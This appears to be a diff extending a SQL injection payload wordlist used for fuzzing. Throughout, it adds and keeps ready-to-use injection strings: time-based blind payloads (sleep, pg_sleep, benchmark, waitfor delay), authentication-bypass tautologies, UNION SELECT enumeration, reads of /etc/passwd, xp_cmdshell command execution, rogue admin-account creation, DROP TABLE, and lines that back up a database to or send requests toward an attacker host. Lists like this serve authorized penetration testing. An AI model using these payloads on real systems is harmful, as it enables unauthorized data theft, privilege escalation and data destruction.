@@ -1,9 +1,12 @@
+1 or sleep(__TIME__)#
 " or sleep(__TIME__)#
 ' or sleep(__TIME__)#
 " or sleep(__TIME__)="
 ' or sleep(__TIME__)='
+1) or sleep(__TIME__)#
 ") or sleep(__TIME__)="
 ') or sleep(__TIME__)='
+1)) or sleep(__TIME__)#
 ")) or sleep(__TIME__)="
 ')) or sleep(__TIME__)='
 ;waitfor delay '0:0:__TIME__'--
@@ -15,6 +18,7 @@
 ));waitfor delay '0:0:__TIME__'--
 '));waitfor delay '0:0:__TIME__'--
 "));waitfor delay '0:0:__TIME__'--
+benchmark(10000000,MD5(1))#
 1 or benchmark(10000000,MD5(1))#
 " or benchmark(10000000,MD5(1))#
 ' or benchmark(10000000,MD5(1))#
@@ -24,12 +28,21 @@
 1)) or benchmark(10000000,MD5(1))#
 ")) or benchmark(10000000,MD5(1))#
 ')) or benchmark(10000000,MD5(1))#
+" or pg_sleep(__TIME__)--
+' or pg_sleep(__TIME__)--
+") or pg_sleep(__TIME__)--
+') or pg_sleep(__TIME__)--
+")) or pg_sleep(__TIME__)--
+')) or pg_sleep(__TIME__)--
 )%20or%20('x'='x
 ; execute immediate 'sel' || 'ect us' || 'er'
+benchmark(10000000,MD5(1))#
 ";waitfor delay '0:0:__TIME__'--
 ||(elt(-3+5,bin(15),ord(10),hex(char(45))))
 "hi"") or (""a""=""a"
 " or sleep(__TIME__)#
+ or 0=0 #
+1) or sleep(__TIME__)#
 ) or ('a'='a
 @var select @var as var into temp end --
 1)) or benchmark(10000000,MD5(1))#
@@ -37,6 +50,7 @@
 " or benchmark(10000000,MD5(1))#
 1 waitfor delay '0:0:10'--
  or 'a'='a
+hi or 1=1 --"
 or a = a
 ) or sleep(__TIME__)='
 )) or benchmark(10000000,MD5(1))#
@@ -45,18 +59,26 @@ hi' or 'a'='a
 hi') or ('a'='a
 ));waitfor delay '0:0:__TIME__'--
 a' waitfor delay '0:0:10'--
+1 or sleep(__TIME__)#
+ and 1 in (select var from temp)--
  or '7659'='7659
  or 'text' = n'text'
  or 1=1 or ''='
 declare @s varchar (200) select @s = 0x73656c6 ...
 ; exec master..xp_cmdshell 'ping 172.10.1.255'--
+" or pg_sleep(__TIME__)--
+x' AND email IS NULL; --
+admin' or '
  or 'unusual' = 'unusual'
 1) or benchmark(10000000,MD5(1))#
 declare @s varchar(200) select @s = 0x77616974 ...
 "));waitfor delay '0:0:__TIME__'--
 or a=a
+) union select * from information_schema.tables;
 " or "a"="a
+x' AND members.email IS NULL; --
  and 1=( if((load_file(char(110,46,101,120,11 ...
+%20'sleep%2050'
 t'exec master..xp_cmdshell 'nslookup www.googl ...
 1 or benchmark(10000000,MD5(1))#
 %20or%20''='
@@ -65,6 +87,7 @@ hi' or 'x'='x';
  or 'whatever' in ('whatever')
 ; begin declare @var varchar(8000) set @var=' ...
  union select 1,load_file('/etc/passwd'),1,1,1;
+ or sleep(__TIME__)#
 a' or 1=1--
 a' or 'a' = 'a
 declare @s varchar(22) select @s =
@@ -72,24 +95,32 @@ declare @s varchar(22) select @s =
  or '1'='1
  or sleep(__TIME__)='
 or 0=0 #"
+" or isNULL(1/0) /*
 declare @s varchar (8000) select @s = 0x73656c ...
 ) or benchmark(10000000,MD5(1))#
 ;waitfor delay '0:0:__TIME__'--
+" or 1=1--
+x' AND userid IS NULL; --
  or 'text' > 't'
  or benchmark(10000000,MD5(1))#
 ");waitfor delay '0:0:__TIME__'--
 a' or 3=3--
  or ''='
 ")) or sleep(__TIME__)="
+hi' or 1=1 --
+") or pg_sleep(__TIME__)--
 %20or%20'x'='x
  or 'something' = 'some'+'thing'
 ) or (a=a
+%27%20or%201=1
 x' AND 1=(SELECT COUNT(*) FROM tabname); --
 ; or '1'='1'
 declare @q nvarchar (200) select @q = 0x770061 ...
 ; exec ('sel' + 'ect us' + 'er')
 anything' OR 'x'='x
 declare @q nvarchar (4000) select @q =
+1)) or sleep(__TIME__)#
+or 0=0 #
  select name from syscolumns where id = (sele ...
 hi or a=a
 );waitfor delay '0:0:__TIME__'--
@@ -100,19 +131,25 @@ or 1=1 or ""=
 x' or 1=1 or 'x'='y
  or '1'='1'--
 "a"" or 1=1--"
+" or 0=0 --
+")) or pg_sleep(__TIME__)--
  or a = a
 declare @q nvarchar (200) select @q = 0x770061006900740066006F0072002000640065006C00610079002000270030003A0030003A0031003000270000 exec(@q)
 declare @s varchar(200) select @s = 0x77616974666F722064656C61792027303A303A31302700 exec(@s) 
 declare @q nvarchar (200) 0x730065006c00650063007400200040004000760065007200730069006f006e00 exec(@q)
 declare @s varchar (200) select @s = 0x73656c65637420404076657273696f6e exec(@s)
+' or 1=1
 x' OR full_name LIKE '%Bob%
 '; exec master..xp_cmdshell 'ping 172.10.1.255'--
 '%20or%20''='
 '%20or%20'x'='x
 ')%20or%20('x'='x
+' or 0=0 --
 ' or 0=0 #
  or 0=0 #"
+' or 1=1--
 ' or '1'='1'--
+' or 1 --'
 ' or 1=1 or ''='
  or 1=1 or ""=
 ' or a=a--
@@ -124,16 +161,26 @@ x' OR full_name LIKE '%Bob%
 ' or userid like '%
 ' or uid like '%
 ' or user like '%
+'; exec master..xp_cmdshell
+'; exec xp_regread
 t'exec master..xp_cmdshell 'nslookup www.google.com'--
+' UNION SELECT
+' UNION ALL SELECT
 <>"'%;)(&+
+'%20or%201=1
 ' or ''='
+' or 3=3
 '; exec master..xp_cmdshell 'ping 10.10.1.2'--
 'create user name identified by 'pass123' --
 'create user name identified by pass123 temporary tablespace temp default tablespace users; 
+' ; drop table temp --
 'exec sp_addlogin 'name' , 'password' --
 ' exec sp_addsrvrolemember 'name' , 'sysadmin' --
 ' insert into mysql.user (user, host, password) values ('name', 'localhost', password('pass123')) --
+' grant connect to name; grant resource to name; --
 ' insert into users(login, password, level) values( char(0x70) + char(0x65) + char(0x74) + char(0x65) + char(0x72) + char(0x70) + char(0x65) + char(0x74) + char(0x65) + char(0x72),char(0x64)
+' or 1=1 --
+' union (select @@version) --
 ' union (select NULL, (select @@version)) --
 ' union (select NULL, NULL, (select @@version)) --
 ' union (select NULL, NULL, NULL,  (select @@version)) --
@@ -145,11 +192,13 @@ exec master..xp_cmdshell 'net+users'
 exec master..xp_cmdshell 'ping+<attackerip>'
 BACKUP database master to disks='\\<attackerip>\<attackerip>\backupdb.dat'
 create table myfile (line varchar(8000))" bulk insert foo from 'c:\inetpub\wwwroot\auth.aspв'" select * from myfile"--
+1 exec sp_ (or exec xp_)
 1' and 1=(select count(*) from tablenames); --
 1' or '1'='1
 create table myfile (input TEXT); load data infile '<filepath>' into table myfile; select * from myfile;
 'OR '' = '
 ' union select 1, '<user-fieldname>', '<pass-fieldname>' 1--
+'OR 1=1--
 ' or '1'='1
 '||utl_http.request('httP://192.168.1.1/')||'
 ' || myappadmin.adduser('admin', 'newpass') || '
@@ -213,5 +262,6 @@ select current_setting('port');
 select current_setting('config_file');
 select current_setting('hba_file');
 select current_setting('data_directory');
+create table myfile (input TEXT);
 SLEEP(1) /*‘ or SLEEP(1) or ‘“ or SLEEP(1) or “*/
 SLEEP(1) /*' or SLEEP(1) or '" or SLEEP(1) or "*/
